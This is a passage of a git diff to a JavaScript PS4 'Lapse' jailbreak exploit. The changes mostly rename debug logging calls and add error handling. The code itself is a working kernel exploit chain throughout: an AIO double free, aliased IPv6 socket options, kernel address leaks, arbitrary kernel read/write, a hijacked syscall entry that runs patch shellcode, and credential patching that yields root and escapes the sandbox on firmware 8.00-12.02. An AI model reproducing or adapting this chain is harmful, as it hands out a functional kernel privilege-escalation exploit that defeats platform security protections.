     const wbuf = malloc(wbufsz);
@@ -1369,7 +1586,7 @@ function leak_kernel_addrs(sd_pair, sds) {
         }
 
         if (reqs2_off !== null && fake_reqs3_off !== null) {
-            debug("Found reqs2 and fake reqs3 at attempt: " + i);
+            log("Found reqs2 and fake reqs3 at attempt: " + i);
             fake_reqs3_sd = sds[sd_idx - 1];
             sds.splice(sd_idx - 1, 1);
             free_rthdrs(sds);
@@ -1381,23 +1598,23 @@ function leak_kernel_addrs(sd_pair, sds) {
     }
 
     if (reqs2_off === null || fake_reqs3_off === null) {
-        debug("Could not leak reqs2 and fake reqs3");
+        log("Could not leak reqs2 and fake reqs3");
         return null;
     }
 
-    debug("reqs2 offset: " + hex(reqs2_off));
-    debug("fake reqs3 offset: " + hex(fake_reqs3_off));
+    log("reqs2 offset: " + hex(reqs2_off));
+    log("fake reqs3 offset: " + hex(fake_reqs3_off));
 
     get_rthdr(sd, buf, buflen);
 
-    debug("Leaked aio_entry:");
+    log("Leaked aio_entry:");
 
     var leak_str = "";
     for (var i = 0; i < 0x80; i += 8) {
         if (i % 16 === 0 && i !== 0) leak_str += "\n";
         leak_str += hex(read64(buf.add(reqs2_off + i))) + " ";
     }
-    debug(leak_str);
+    log(leak_str);
     
 
     const aio_info_addr = read64(buf.add(reqs2_off + 0x18));
@@ -1405,10 +1622,10 @@ function leak_kernel_addrs(sd_pair, sds) {
     reqs1_addr = reqs1_addr.and(new BigInt(0xFFFFFFFF, 0xFFFFFF00));
     const fake_reqs3_addr = kbuf_addr.add(fake_reqs3_off + reqs3_offset);
 
-    debug("reqs1_addr = " + hex(reqs1_addr));
-    debug("fake_reqs3_addr = " + hex(fake_reqs3_addr));
+    log("reqs1_addr = " + hex(reqs1_addr));
+    log("fake_reqs3_addr = " + hex(fake_reqs3_addr));
 
-    debug("Searching for target_id...");
+    log("Searching for target_id...");
 
 
     var target_id = null;
@@ -1426,7 +1643,7 @@ function leak_kernel_addrs(sd_pair, sds) {
             target_id = read32(leak_ids.add(i * 4));
             write32(leak_ids.add(i * 4), 0);
 
-            debug("Found target_id=" + hex(target_id) + ", i=" + i + ", batch=" + Math.floor(i / num_elems));
+            log("Found target_id=" + hex(target_id) + ", i=" + i + ", batch=" + Math.floor(i / num_elems));
 
             const start = i + num_elems;
             to_cancel = leak_ids + start * 4;
@@ -1437,7 +1654,7 @@ function leak_kernel_addrs(sd_pair, sds) {
     }
 
     if (target_id === null) {
-        debug("Target ID not found");
+        log("Target ID not found");
 
         return null;
     }
@@ -1445,7 +1662,7 @@ function leak_kernel_addrs(sd_pair, sds) {
     cancel_aios(to_cancel, to_cancel_len);
     free_aios2(leak_ids, leak_ids_len);
 
-    debug("Kernel addresses leaked successfully!");
+    log("Kernel addresses leaked successfully!");
 
     return {
         reqs1_addr: reqs1_addr,
@@ -1810,7 +2027,7 @@ function make_aliased_pktopts(sds) {
             
             if (marker !== i) {
                 const sd_pair = [sds[i], sds[marker]];
-                debug("Aliased pktopts at attempt " + loop + " (pair: " + sd_pair[0] + ", " + sd_pair[1] + ")");
+                log("Aliased pktopts at attempt " + loop + " (pair: " + sd_pair[0] + ", " + sd_pair[1] + ")");
                 if (marker > i) {
                     sds.splice(marker, 1);
                     sds.splice(i, 1);
@@ -1848,7 +2065,7 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
     const aio_ids_len = num_batches * num_elems;
     const aio_ids = malloc(4 * aio_ids_len);
     
-    debug("Overwriting rthdr with AIO queue entry...");
+    log("Overwriting rthdr with AIO queue entry...");
     var aio_not_found = true;
     free_evf(evf);
     
@@ -1859,7 +2076,7 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
         const cmd = read32(buf);
         
         if (size_ret === 8 && cmd === AIO_CMD_READ) {
-            debug("Aliased at attempt " + i);
+            log("Aliased at attempt " + i);
             aio_not_found = false;
             cancel_aios(aio_ids, aio_ids_len);
             break;
@@ -1869,7 +2086,7 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
     }
     
     if (aio_not_found) {
-        debug("Failed to overwrite rthdr");
+        log("Failed to overwrite rthdr");
         return null;
     }
     
@@ -1887,7 +2104,7 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
         addr_cache.push(aio_ids.add(i * num_elems * 4));
     }
     
-    debug("Overwriting AIO queue entry with rthdr...");
+    log("Overwriting AIO queue entry with rthdr...");
 
     close(sd);
     sd = null;
@@ -1898,7 +2115,7 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
             for (var j = 0; j < sds.length; j++) {
                 set_rthdr(sds[j], reqs2, rsize);
             }
-            //debug("before for batch = 0 ...")
+            //log("before for batch = 0 ...")
             for (var batch = 0; batch < addr_cache.length; batch++) {
                 for (var j = 0; j < num_elems; j++) {
                     write32(states.add(j * 4), 0xFFFFFFFF);
@@ -1916,7 +2133,7 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
                 }
 
                 if (req_idx !== -1) {
-                    debug("Found req_id at batch " + batch + ", attempt " + i);
+                    log("Found req_id at batch " + batch + ", attempt " + i);
                     const aio_idx = batch * num_elems + req_idx;
                     const req_id_p = aio_ids.add(aio_idx * 4);
                     const req_id = read32(req_id_p);
@@ -1933,7 +2150,7 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
     
     const req_id = overwrite_aio_entry_with_rthdr();
     if (req_id === null) {
-        debug("Failed to overwrite AIO queue entry");
+        log("Failed to overwrite AIO queue entry");
         return null;
     }
     
@@ -1952,10 +2169,10 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
     write32(target_ids, req_id);
     write32(target_ids.add(4), target_id);
     
-    debug("Triggering double free...");
+    log("Triggering double free...");
     aio_multi_delete_fun(target_ids, 2, sce_errs);
     
-    debug("Reclaiming memory...");
+    log("Reclaiming memory...");
     
     const sd_pair = make_aliased_pktopts(sds_alt);
     
@@ -1969,22 +2186,22 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
     
     var success = true;
     if (read32(states) !== SCE_KERNEL_ERROR_ESRCH) {
-        debug("ERROR: Bad delete of corrupt AIO request");
+        log("ERROR: Bad delete of corrupt AIO request");
         success = false;
     }
     
     if (err1 !== 0 || err1 !== err2) {
-        debug("ERROR: Bad delete of ID pair");
+        log("ERROR: Bad delete of ID pair");
         success = false;
     }
     
     if (!success) {
-        debug("Double free failed");
+        log("Double free failed");
         return null;
     }
     
     if (sd_pair === null) {
-        debug("Failed to make aliased pktopts");
+        log("Failed to make aliased pktopts");
         return null;
     }
     
@@ -2007,7 +2224,7 @@ function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio
         // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
         write64(pktopts.add(0x10), pktinfo_p);
         
-        debug("Overwriting main pktopts");
+        log("Overwriting main pktopts");
         var reclaim_sock = null;
         
         close(pktopts_sds[1]);
@@ -2021,7 +2238,7 @@ function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio
             get_sockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
             const marker = read32(tclass);
             if ((marker & 0xffff) === 0x4141) {
-                debug("Found reclaim socket at attempt: " + i);
+                log("Found reclaim socket at attempt: " + i);
                 const idx = Number(marker >> 16);
                 reclaim_sock = sds_alt[idx];
                 sds_alt.splice(idx, 1);
@@ -2030,7 +2247,7 @@ function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio
         }
         
         if (reclaim_sock === null) {
-            debug("Failed to overwrite main pktopts");
+            log("Failed to overwrite main pktopts");
             return null;
         }
         
@@ -2063,22 +2280,22 @@ function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio
         }
         
         const test_read = slow_kread8(kernel_addr);
-        debug("slow_kread8(\"evf cv\"): " + hex(test_read));
+        log("slow_kread8(\"evf cv\"): " + hex(test_read));
         const kstr = read_cstring(read_buf);
-        debug("*(\"evf cv\"): " + kstr);
+        log("*(\"evf cv\"): " + kstr);
         
         if (kstr !== "evf cv") {
-            debug("Test read of \"evf cv\" failed");
+            log("Test read of \"evf cv\" failed");
             return null;
         }
         
-        debug("Slow arbitrary kernel read achieved");
+        log("Slow arbitrary kernel read achieved");
         
         // Get curproc from previously freed aio_info
         const curproc = slow_kread8(aio_info_addr.add(8));
         
         if (Number(curproc.shr(48)) !== 0xffff) {
-            debug("Invalid curproc kernel address: " + hex(curproc));
+            log("Invalid curproc kernel address: " + hex(curproc));
             return null;
         }
         
@@ -2086,11 +2303,11 @@ function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio
         const current_pid = Number(getpid());
         
         if ((possible_pid & 0xffffffff) !== (current_pid & 0xffffffff)) {
-            debug("curproc verification failed: " + hex(curproc));
+            log("curproc verification failed: " + hex(curproc));
             return null;
         }
         
-        debug("curproc = " + hex(curproc));
+        log("curproc = " + hex(curproc));
         
         kernel.addr.curproc = curproc;
         kernel.addr.curproc_fd = slow_kread8((kernel.addr.curproc).add(kernel_offset.PROC_FD));
@@ -2152,11 +2369,11 @@ function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio
 
         const kstr2 = read_cstring(read_buf);
         if (kstr2 !== "evf cv") {
-            debug("Test read of \"evf cv\" failed");
+            log("Test read of \"evf cv\" failed");
             return null;
         }
         
-        debug("Restricted kernel r/w achieved");
+        log("Restricted kernel r/w achieved");
         
         // Initialize ipv6_kernel_rw with restricted write
         ipv6_kernel_rw.init(kernel.addr.curproc_ofiles, kread8, restricted_kwrite8);
@@ -2168,11 +2385,11 @@ function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio
         
         const kstr3 = kernel.read_null_terminated_string(kernel_addr);
         if (kstr3 !== "evf cv") {
-            debug("Test read of \"evf cv\" failed");
+            log("Test read of \"evf cv\" failed");
             return null;
         }
         
-        debug("Arbitrary kernel r/w achieved!");
+        log("Arbitrary kernel r/w achieved!");
         
         // RESTORE: clean corrupt pointers
         const off_ip6po_rthdr = kernel_offset.IP6PO_RTHDR;
@@ -2201,13 +2418,13 @@ function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio
             kernel.write_dword(sock_addr.add(0x0), 0x100);  // so_count
         }
         
-        debug("Fixes applied");
+        log("Fixes applied");
         
         return true;
         
     } catch (e) {
-        debug("make_kernel_arw error: " + e.message);
-        debug(e.stack);
+        log("make_kernel_arw error: " + e.message);
+        log(e.stack);
         return null;
     }
 }
@@ -2221,11 +2438,11 @@ function apply_kernel_patches(fw_version) {
         // Get shellcode for this firmware
         const shellcode = get_kpatch_shellcode(fw_version);
         if (!shellcode) {
-            debug("No kernel patch shellcode for FW " + fw_version);
+            log("No kernel patch shellcode for FW " + fw_version);
             return false;
         }
 
-        debug("Kernel patch shellcode: " + shellcode.length + " bytes");
+        log("Kernel patch shellcode: " + shellcode.length + " bytes");
 
         // Constants
         const PROT_READ = 0x1;
@@ -2238,23 +2455,23 @@ function apply_kernel_patches(fw_version) {
 
         // Get sysent[661] address and save original values
         const sysent_661_addr = kernel.addr.base.add(kernel_offset.SYSENT_661);
-        debug("sysent[661] @ " + hex(sysent_661_addr));
+        log("sysent[661] @ " + hex(sysent_661_addr));
 
         const sy_narg = kernel.read_dword(sysent_661_addr);
         const sy_call = kernel.read_qword(sysent_661_addr.add(8));
         const sy_thrcnt = kernel.read_dword(sysent_661_addr.add(0x2C));
 
-        debug("Original sy_narg: " + hex(sy_narg));
-        debug("Original sy_call: " + hex(sy_call));
-        debug("Original sy_thrcnt: " + hex(sy_thrcnt));
+        log("Original sy_narg: " + hex(sy_narg));
+        log("Original sy_call: " + hex(sy_call));
+        log("Original sy_thrcnt: " + hex(sy_thrcnt));
 
         // Calculate jmp rsi gadget address
         const jmp_rsi_gadget = kernel.addr.base.add(kernel_offset.JMP_RSI_GADGET);
-        debug("jmp rsi gadget @ " + hex(jmp_rsi_gadget));
+        log("jmp rsi gadget @ " + hex(jmp_rsi_gadget));
 
         // Allocate buffer for shellcode in userspace first
         const shellcode_buf = malloc(shellcode.length + 0x100);
-        debug("Shellcode buffer @ " + hex(shellcode_buf));
+        log("Shellcode buffer @ " + hex(shellcode_buf));
 
         // Copy shellcode to userspace buffer
         for (var i = 0; i < shellcode.length; i++) {
@@ -2263,35 +2480,35 @@ function apply_kernel_patches(fw_version) {
 
         // Verify first bytes
         const first_bytes = read32(shellcode_buf);
-        debug("First bytes @ shellcode: " + hex(first_bytes));
+        log("First bytes @ shellcode: " + hex(first_bytes));
 
         // Hijack sysent[661] to point to jmp rsi gadget
-        debug("Hijacking sysent[661]...");
+        log("Hijacking sysent[661]...");
         kernel.write_dword(sysent_661_addr, 2);                      // sy_narg = 2
         kernel.write_qword(sysent_661_addr.add(8), jmp_rsi_gadget);  // sy_call = jmp rsi
         kernel.write_dword(sysent_661_addr.add(0x2C), 1);            // sy_thrcnt = 1
-        debug("Hijacked sysent[661]");
+        log("Hijacked sysent[661]");
 
         // Check if jitshm_create has a dedicated gadget
         const jitshm_num = 0x215; // SYSCALL.jitshm_create = 0x215n;     // 533
         const jitshm_gadget = syscalls.map.get(jitshm_num);
-        debug("jitshm_create gadget: " + (jitshm_gadget ? hex(jitshm_gadget) : "NOT FOUND"));
+        log("jitshm_create gadget: " + (jitshm_gadget ? hex(jitshm_gadget) : "NOT FOUND"));
 
         // Try using the standard syscall() function if gadget exists
         if (!jitshm_gadget) {
-            debug("ERROR: jitshm_create gadget not found in libkernel");
-            debug("Kernel patches require jitshm_create syscall support");
+            log("ERROR: jitshm_create gadget not found in libkernel");
+            log("Kernel patches require jitshm_create syscall support");
             return false;
         }
 
         // 1. jitshm_create(0, aligned_memsz, PROT_RWX)
-        debug("Calling jitshm_create...");
+        log("Calling jitshm_create...");
 
         const exec_handle = jitshm_create(0, aligned_memsz, PROT_RWX);
-        debug("jitshm_create handle: " + hex(exec_handle));
+        log("jitshm_create handle: " + hex(exec_handle));
 
         if (Number(exec_handle.shr(32)) >= 0xffff8000) {
-            debug("ERROR: jitshm_create failed");
+            log("ERROR: jitshm_create failed");
             kernel.write_dword(sysent_661_addr, sy_narg);
             kernel.write_qword(sysent_661_addr.add(8), sy_call);
             kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt);
@@ -2299,13 +2516,13 @@ function apply_kernel_patches(fw_version) {
         }
 
         // 2. mmap(mapping_addr, aligned_memsz, PROT_RWX, MAP_SHARED|MAP_FIXED, exec_handle, 0)
-        debug("Calling mmap...");
+        log("Calling mmap...");
 
         const mmap_result = mmap(mapping_addr, aligned_memsz, PROT_RWX, 0x11, exec_handle, 0);
-        debug("mmap result: " + hex(mmap_result));
+        log("mmap result: " + hex(mmap_result));
 
         if (Number(mmap_result.shr(32)) >= 0xffff8000) {
-            debug("ERROR: mmap failed");
+            log("ERROR: mmap failed");
             kernel.write_dword(sysent_661_addr, sy_narg);
             kernel.write_qword(sysent_661_addr.add(8), sy_call);
             kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt);
@@ -2313,24 +2530,24 @@ function apply_kernel_patches(fw_version) {
         }
 
         // 3. Copy shellcode to mapped memory
-        debug("Copying shellcode to " + hex(mapping_addr) + "...");
+        log("Copying shellcode to " + hex(mapping_addr) + "...");
         for (var j = 0; j < shellcode.length; j++) {
             write8(mapping_addr.add(j), shellcode[j]);
         }
 
         // Verify
         const verify_bytes = read32(mapping_addr);
-        debug("First bytes @ mapped: " + hex(verify_bytes));
+        log("First bytes @ mapped: " + hex(verify_bytes));
 
         // 4. kexec(mapping_addr) - syscall 661, hijacked to jmp rsi
-        debug("Calling kexec...");
+        log("Calling kexec...");
 
         const kexec_result = kexec(mapping_addr);
-        debug("kexec returned: " + hex(kexec_result));
+        log("kexec returned: " + hex(kexec_result));
 
         // === Verify 12.00 kernel patches ===
         if (fw_version === "12.00" || fw_version === "12.02") {
-            debug("Verifying 12.00 kernel patches...");
+            log("Verifying 12.00 kernel patches...");
             var patch_errors = 0;
 
             // Patch offsets and expected values for 12.00
@@ -2372,9 +2589,9 @@ function apply_kernel_patches(fw_version) {
                 }
 
                 if (actual === p.exp) {
-                    debug("  [OK] " + p.name);
+                    log("  [OK] " + p.name);
                 } else {
-                    debug("  [FAIL] " + p.name + ": expected " + hex(p.exp) + ", got " + hex(actual));
+                    log("  [FAIL] " + p.name + ": expected " + hex(p.exp) + ", got " + hex(actual));
                     patch_errors++;
                 }
             }
@@ -2383,33 +2600,33 @@ function apply_kernel_patches(fw_version) {
             const sysent11_call = kernel.read_qword(kernel.addr.base.add(0x1102d88));
             const expected_gadget = kernel.addr.base.add(0x47b31);
             if (sysent11_call.eq(expected_gadget)) {
-                debug("  [OK] sysent11_call -> jmp_rsi @ " + hex(sysent11_call));
+                log("  [OK] sysent11_call -> jmp_rsi @ " + hex(sysent11_call));
             } else {
-                debug("  [FAIL] sysent11_call: expected " + hex(expected_gadget) + ", got " + hex(sysent11_call));
+                log("  [FAIL] sysent11_call: expected " + hex(expected_gadget) + ", got " + hex(sysent11_call));
                 patch_errors++;
             }
 
             if (patch_errors === 0) {
-                debug("All 12.00 kernel patches verified OK!");
+                log("All 12.00 kernel patches verified OK!");
             } else {
-                debug("[WARNING] " + patch_errors + " kernel patches failed!");
+                log("[WARNING] " + patch_errors + " kernel patches failed!");
             }
         }
 
         // Restore original sysent[661]
-        debug("Restoring sysent[661]...");
+        log("Restoring sysent[661]...");
         kernel.write_dword(sysent_661_addr, sy_narg);
         kernel.write_qword(sysent_661_addr.add(8), sy_call);
         kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt);
-        debug("Restored sysent[661]");
+        log("Restored sysent[661]");
 
-        debug("Kernel patches applied!");
+        log("Kernel patches applied!");
 
         return true;
 
     } catch (e) {
-        debug("apply_kernel_patches error: " + e.message);
-        debug(e.stack);
+        log("apply_kernel_patches error: " + e.message);
+        log(e.stack);
         return false;
     }
 }
@@ -2418,220 +2635,231 @@ function apply_kernel_patches(fw_version) {
 
 function lapse() {
 
-    debug("=== PS4 Lapse Jailbreak ===");
+    try {
+        log("=== PS4 Lapse Jailbreak ===");
 
-    FW_VERSION = get_fwversion();
-    debug("Detected PS4 firmware: " + FW_VERSION);
+        FW_VERSION = get_fwversion();
+        log("Detected PS4 firmware: " + FW_VERSION);
 
-    function compare_version(a, b) {
-        const a_arr = a.split('.');
-        const amaj = a_arr[0];
-        const amin = a_arr[1];
-        const b_arr = b.split('.');
-        const bmaj = b_arr[0];
-        const bmin = b_arr[1];
-        return amaj === bmaj ? amin - bmin : amaj - bmaj;
-    }
+        function compare_version(a, b) {
+            const a_arr = a.split('.');
+            const amaj = a_arr[0];
+            const amin = a_arr[1];
+            const b_arr = b.split('.');
+            const bmaj = b_arr[0];
+            const bmin = b_arr[1];
+            return amaj === bmaj ? amin - bmin : amaj - bmaj;
+        }
 
-    if (compare_version(FW_VERSION, "8.00") < 0 || compare_version(FW_VERSION, "12.02") > 0) {
-        debug("Unsupported PS4 firmware\nSupported: 8.00-12.02\nAborting...");
-        send_notification("Unsupported PS4 firmware\nAborting...");
-        return;
-    }
+        if (compare_version(FW_VERSION, "8.00") < 0 || compare_version(FW_VERSION, "12.02") > 0) {
+            log("Unsupported PS4 firmware\nSupported: 8.00-12.02\nAborting...");
+            send_notification("Unsupported PS4 firmware\nAborting...");
+            return false;
+        }
 
-    kernel_offset = get_kernel_offset(FW_VERSION);
-    debug("Kernel offsets loaded for FW " + FW_VERSION);
+        kernel_offset = get_kernel_offset(FW_VERSION);
+        log("Kernel offsets loaded for FW " + FW_VERSION);
 
-    // === STAGE 0: Setup ===
-    debug("=== STAGE 0: Setup ===");
+        // === STAGE 0: Setup ===
+        log("=== STAGE 0: Setup ===");
 
-    const setup_success = setup();
-    if (!setup_success) {
-        debug("Setup failed");
-        send_notification("Lapse: Setup failed");
-        //return;
-    }
-    debug("Setup completed");
+        const setup_success = setup();
+        if (!setup_success) {
+            log("Setup failed");
+            send_notification("Lapse: Setup failed");
+            return false;
+        }
+        log("Setup completed");
 
-    debug("");
-    debug("=== STAGE 1: Double-free AIO ===");
+        log("");
+        log("=== STAGE 1: Double-free AIO ===");
 
-    const sd_pair = double_free_reqs2();
+        const sd_pair = double_free_reqs2();
 
-    if (sd_pair === null) {
-        debug("[FAILED] Stage 1");
-        send_notification("Lapse: FAILED at Stage 1");
-        return;
-    }
-    debug("Stage 1 completed");
+        if (sd_pair === null) {
+            log("[FAILED] Stage 1");
+            send_notification("Lapse: FAILED at Stage 1");
+            return false;
+        }
+        log("Stage 1 completed");
 
-    debug("");
-    debug("=== STAGE 2: Leak kernel addresses ===");
-    leak_result = leak_kernel_addrs(sd_pair, sds);
-    if (leak_result === null) {
-        debug("Stage 2 kernel address leak failed");
-        cleanup_fail();
-        return;
-    }
-    debug("Stage 2 completed");
-    debug("Leaked addresses:");
-    debug("  reqs1_addr: " + hex(leak_result.reqs1_addr));
-    debug("  kbuf_addr: " + hex(leak_result.kbuf_addr));
-    debug("  kernel_addr: " + hex(leak_result.kernel_addr));
-    debug("  target_id: " + hex(leak_result.target_id));
-    debug("  fake_reqs3_addr: " + hex(leak_result.fake_reqs3_addr));
-    debug("  aio_info_addr: " + hex(leak_result.aio_info_addr));
-    debug("  evf: " + hex(leak_result.evf));
+        log("");
+        log("=== STAGE 2: Leak kernel addresses ===");
+        leak_result = leak_kernel_addrs(sd_pair, sds);
+        if (leak_result === null) {
+            log("Stage 2 kernel address leak failed");
+            cleanup_fail();
+            return false;
+        }
+        log("Stage 2 completed");
+        log("Leaked addresses:");
+        log("  reqs1_addr: " + hex(leak_result.reqs1_addr));
+        log("  kbuf_addr: " + hex(leak_result.kbuf_addr));
+        log("  kernel_addr: " + hex(leak_result.kernel_addr));
+        log("  target_id: " + hex(leak_result.target_id));
+        log("  fake_reqs3_addr: " + hex(leak_result.fake_reqs3_addr));
+        log("  aio_info_addr: " + hex(leak_result.aio_info_addr));
+        log("  evf: " + hex(leak_result.evf));
 
-    debug("");
-    debug("=== STAGE 3: Double free SceKernelAioRWRequest ===");
-    const pktopts_sds = double_free_reqs1(
-        leak_result.reqs1_addr,
-        leak_result.target_id,
-        leak_result.evf,
-        sd_pair[0],
-        sds,
-        sds_alt,
-        leak_result.fake_reqs3_addr
-    );
-    
-    close(leak_result.fake_reqs3_sd);
+        log("");
+        log("=== STAGE 3: Double free SceKernelAioRWRequest ===");
+        const pktopts_sds = double_free_reqs1(
+            leak_result.reqs1_addr,
+            leak_result.target_id,
+            leak_result.evf,
+            sd_pair[0],
+            sds,
+            sds_alt,
+            leak_result.fake_reqs3_addr
+        );
+        
+        close(leak_result.fake_reqs3_sd);
 
-    if (pktopts_sds === null) {
-        debug("Stage 3 double free SceKernelAioRWRequest failed");
-        cleanup_fail();
-        return;
-    }
-    
-    debug("Stage 3 completed!");
-    debug("Aliased socket pair: " + hex(pktopts_sds[0]) + ", " + hex(pktopts_sds[1]));
-    
-    debug("");
-    debug("=== STAGE 4: Get arbitrary kernel read/write ===");
+        if (pktopts_sds === null) {
+            log("Stage 3 double free SceKernelAioRWRequest failed");
+            cleanup_fail();
+            return false;
+        }
+        
+        log("Stage 3 completed!");
+        log("Aliased socket pair: " + hex(pktopts_sds[0]) + ", " + hex(pktopts_sds[1]));
+        
+        log("");
+        log("=== STAGE 4: Get arbitrary kernel read/write ===");
 
-    arw_result = make_kernel_arw(
-        pktopts_sds,
-        leak_result.reqs1_addr,
-        leak_result.kernel_addr,
-        sds,
-        sds_alt,
-        leak_result.aio_info_addr
-    );
-    
-    if (arw_result === null) {
-        debug("Stage 4 get arbitrary kernel read/write failed");
-        cleanup_fail();
-        return;
-    }
-    
-    debug("Stage 4 completed!");
+        arw_result = make_kernel_arw(
+            pktopts_sds,
+            leak_result.reqs1_addr,
+            leak_result.kernel_addr,
+            sds,
+            sds_alt,
+            leak_result.aio_info_addr
+        );
+        
+        if (arw_result === null) {
+            log("Stage 4 get arbitrary kernel read/write failed");
+            cleanup_fail();
+            return false;
+        }
+        
+        log("Stage 4 completed!");
 
-    debug("");
-    debug("=== STAGE 5: Jailbreak ===");
+        log("");
+        log("=== STAGE 5: Jailbreak ===");
 
-    const OFFSET_P_UCRED = 0x40;
-    const proc = kernel.addr.curproc;
+        const OFFSET_P_UCRED = 0x40;
+        const proc = kernel.addr.curproc;
 
-    // Calculate kernel base
-    kernel.addr.base = kernel.addr.inside_kdata.sub(kernel_offset.EVF_OFFSET);
-    debug("Kernel base: " + hex(kernel.addr.base));
+        // Calculate kernel base
+        kernel.addr.base = kernel.addr.inside_kdata.sub(kernel_offset.EVF_OFFSET);
+        log("Kernel base: " + hex(kernel.addr.base));
 
-    const uid_before = Number(getuid());
-    const sandbox_before = Number(is_in_sandbox());
-    debug("BEFORE: uid=" + uid_before + ", sandbox=" + sandbox_before);
+        const uid_before = Number(getuid());
+        const sandbox_before = Number(is_in_sandbox());
+        log("BEFORE: uid=" + uid_before + ", sandbox=" + sandbox_before);
 
-    // Patch ucred
-    const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD));
-    const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED));
+        // Patch ucred
+        const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD));
+        const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED));
 
-    kernel.write_dword(ucred.add(0x04), 0);  // cr_uid
-    kernel.write_dword(ucred.add(0x08), 0);  // cr_ruid
-    kernel.write_dword(ucred.add(0x0C), 0);  // cr_svuid
-    kernel.write_dword(ucred.add(0x10), 1);  // cr_ngroups
-    kernel.write_dword(ucred.add(0x14), 0);  // cr_rgid
+        kernel.write_dword(ucred.add(0x04), 0);  // cr_uid
+        kernel.write_dword(ucred.add(0x08), 0);  // cr_ruid
+        kernel.write_dword(ucred.add(0x0C), 0);  // cr_svuid
+        kernel.write_dword(ucred.add(0x10), 1);  // cr_ngroups
+        kernel.write_dword(ucred.add(0x14), 0);  // cr_rgid
 
-    const prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0));
-    kernel.write_qword(ucred.add(0x30), prison0);
+        const prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0));
+        kernel.write_qword(ucred.add(0x30), prison0);
 
-    kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF));  // sceCaps
-    kernel.write_qword(ucred.add(0x68), new BigInt(0xFFFFFFFF, 0xFFFFFFFF));
+        kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF));  // sceCaps
+        kernel.write_qword(ucred.add(0x68), new BigInt(0xFFFFFFFF, 0xFFFFFFFF));
 
-    const rootvnode = kernel.read_qword(kernel.addr.base.add(kernel_offset.ROOTVNODE));
-    kernel.write_qword(proc_fd.add(0x10), rootvnode);  // fd_rdir
-    kernel.write_qword(proc_fd.add(0x18), rootvnode);  // fd_jdir
+        const rootvnode = kernel.read_qword(kernel.addr.base.add(kernel_offset.ROOTVNODE));
+        kernel.write_qword(proc_fd.add(0x10), rootvnode);  // fd_rdir
+        kernel.write_qword(proc_fd.add(0x18), rootvnode);  // fd_jdir
 
-    const uid_after = Number(getuid());
-    const sandbox_after = Number(is_in_sandbox());
-    debug("AFTER:  uid=" + uid_after + ", sandbox=" + sandbox_after);
+        const uid_after = Number(getuid());
+        const sandbox_after = Number(is_in_sandbox());
+        log("AFTER:  uid=" + uid_after + ", sandbox=" + sandbox_after);
 
-    if (uid_after === 0 && sandbox_after === 0) {
-        debug("Sandbox escape complete!");
-    } else {
-        debug("[WARNING] Sandbox escape may have failed");
-    }
+        if (uid_after === 0 && sandbox_after === 0) {
+            log("Sandbox escape complete!");
+        } else {
+            log("[WARNING] Sandbox escape may have failed");
+        }
 
-    // === Apply kernel patches via kexec ===
-    // Uses syscall_raw() which sets rax manually for syscalls without gadgets
-    debug("Applying kernel patches...");
-    const kpatch_result = apply_kernel_patches(FW_VERSION);
-    if (kpatch_result) {
-        debug("Kernel patches applied successfully!");
+        // === Apply kernel patches via kexec ===
+        // Uses syscall_raw() which sets rax manually for syscalls without gadgets
+        log("Applying kernel patches...");
+        const kpatch_result = apply_kernel_patches(FW_VERSION);
+        if (kpatch_result) {
+            log("Kernel patches applied successfully!");
 
-        // Comprehensive kernel patch verification
-        debug("Verifying kernel patches...");
-        var all_patches_ok = true;
+            // Comprehensive kernel patch verification
+            log("Verifying kernel patches...");
+            var all_patches_ok = true;
 
-        // 1. Verify mmap RWX patch (0x33 -> 0x37 at two locations)
-        const mmap_offsets = get_mmap_patch_offsets(FW_VERSION);
-        if (mmap_offsets) {
-            const b1 = ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[0]));
-            const b2 = ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[1]));
-            const byte1 = Number(b1.and(0xff));
-            const byte2 = Number(b2.and(0xff));
-            if (byte1 === 0x37 && byte2 === 0x37) {
-                debug("  [OK] mmap RWX patch");
+            // 1. Verify mmap RWX patch (0x33 -> 0x37 at two locations)
+            const mmap_offsets = get_mmap_patch_offsets(FW_VERSION);
+            if (mmap_offsets) {
+                const b1 = ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[0]));
+                const b2 = ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[1]));
